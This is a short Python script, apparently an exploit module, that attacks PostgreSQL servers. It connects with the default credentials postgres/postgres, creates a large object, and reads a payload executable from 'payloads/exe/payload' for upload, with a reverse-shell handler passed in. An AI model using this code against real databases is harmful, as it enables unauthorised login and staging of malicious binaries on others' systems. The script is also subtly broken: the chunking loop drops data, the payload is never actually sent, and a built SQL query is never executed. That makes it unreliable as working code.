#!/usr/bin/env python3

import psycopg2, time

def upload_binary_data(data, rfname=None):
    chunks = []
    print(len(data))
    while len(data) > 0:
        print("BEFORE: ", len(data))
        data = data[2047::]
        chunks.append(data)
        print("AFTER: ", len(data))
        time.sleep(1)
    for i in chunks:
        print(len(i))

def sql_exec(cmd):
    cur.execute(cmd)
    try:
        return cur.fetchone()
    except psycopg2.ProgrammingError:
        return

def do_logon(target, port):
    global cur
    try:
        con = psycopg2.connect(database='template1', user='postgres', \
                               password='postgres', host=target, port=port)
    except:
        print("error"); return False
    cur = con.cursor()
    return True

def exploit(args, port, reverse_handler):
    if do_logon(args.target, port) != True:
        return
    elo = sql_exec('SELECT lo_creat(-1);')[0]
    query = "delete from pg_largeobject where loid=%d" % (elo)
    with open("payloads/exe/payload", "rb") as file:
        data = file.read()
    upload_binary_data(data)


def run(args, data, reverse_handler):
    exploit(args, 5432, reverse_handler)
